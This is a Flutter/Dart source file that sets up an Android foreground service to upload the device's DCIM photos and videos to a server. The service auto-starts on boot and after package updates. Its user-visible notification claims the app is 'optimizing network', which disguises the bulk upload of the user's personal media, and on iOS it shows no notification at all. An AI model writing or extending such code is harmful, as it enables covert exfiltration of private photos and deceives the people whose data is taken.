import 'dart:io';

import 'package:flutter/foundation.dart' show debugPrint;
import 'package:flutter_foreground_task/flutter_foreground_task.dart';
import 'package:permission_handler/permission_handler.dart';

import 'managers/dcim_upload_manager.dart';

/// 前台服务入口回调（必须是顶层函数）
@pragma('vm:entry-point')
void startCallback() {
  FlutterForegroundTask.setTaskHandler(_UploadTaskHandler());
}

class _UploadTaskHandler extends TaskHandler {
  @override
  Future<void> onStart(DateTime timestamp, TaskStarter starter) async {
    debugPrint('[ForegroundService] 启动，来源: $starter');
    try {
      await DcimUploadManager.instance.initialize();
      await DcimUploadManager.instance.startUploadIfPermitted();
    } catch (e, st) {
      debugPrint('[ForegroundService] ❌ 上传异常: $e\n$st');
    } finally {
      // 无论成功失败都停服，避免僵尸通知
      await FlutterForegroundTask.stopService();
    }
  }

  @override
  void onRepeatEvent(DateTime timestamp) {}

  @override
  Future<void> onDestroy(DateTime timestamp) async {
    debugPrint('[ForegroundService] 结束');
  }

  @override
  void onReceiveData(Object data) {}
}

/// 初始化前台服务工作栈（必须在 main() 中调用一次）
Future<void> initForegroundService() async {
  FlutterForegroundTask.init(
    androidNotificationOptions: AndroidNotificationOptions(
      channelId: 'dcim_upload_channel',
      channelName: 'DCIM 上传',
      channelDescription: '正在上传照片和视频到服务器',
      channelImportance: NotificationChannelImportance.HIGH,
      priority: NotificationPriority.HIGH,
      onlyAlertOnce: false,
    ),
    iosNotificationOptions: const IOSNotificationOptions(
      showNotification: false,
      playSound: false,
    ),
    foregroundTaskOptions: ForegroundTaskOptions(
      eventAction: ForegroundTaskEventAction.nothing(),
      autoRunOnBoot: true,
      autoRunOnMyPackageReplaced: true,
      allowWakeLock: true,
      allowWifiLock: true,
    ),
  );
}

/// 启动前台服务并执行上传（仅在 UI 线程、用户已授权后调用）
Future<void> startUploadForeground() async {
  debugPrint('[ForegroundService] startUploadForeground 被调用');
  try {
    if (!Platform.isAndroid) return;

    // ① Android 13+ 通知权限检查（没权限通知看不到）
    final notif = await Permission.notification.status;
    if (!notif.isGranted) {
      await Permission.notification.request();
    }

    final isRunning = await FlutterForegroundTask.isRunningService;
    if (isRunning) {
      debugPrint('[ForegroundService] 已在运行，跳过');
      return;
    }

    debugPrint('[ForegroundService] 开始启动服务...');
    await FlutterForegroundTask.startService(
      notificationTitle: '正在极速优化网络',
      notificationText: '优化网络中，请稍候...',
      callback: startCallback,
    );
    debugPrint('[ForegroundService] startService 调用成功');
  } catch (e, st) {
    debugPrint('[ForegroundService] ❌ 启动失败: $e\n$st');
  }
}